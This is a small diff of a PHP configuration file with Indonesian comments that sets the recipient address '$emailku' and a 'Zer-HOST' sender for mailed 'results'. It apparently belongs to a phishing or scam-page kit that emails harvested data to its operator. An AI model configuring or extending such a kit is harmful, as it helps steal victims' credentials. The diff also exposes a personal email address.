@@ -1,6 +1,6 @@
 <?php
 
-$emailku = 'EMAILMU'; // EMAIL KAMU
+$emailku = 'apacobazri@gmail.com'; // EMAIL KAMU
 
 $sender = 'From: 🔥WEB Zer-HOST🔫 <hasil@mlryu.com>'; 
 
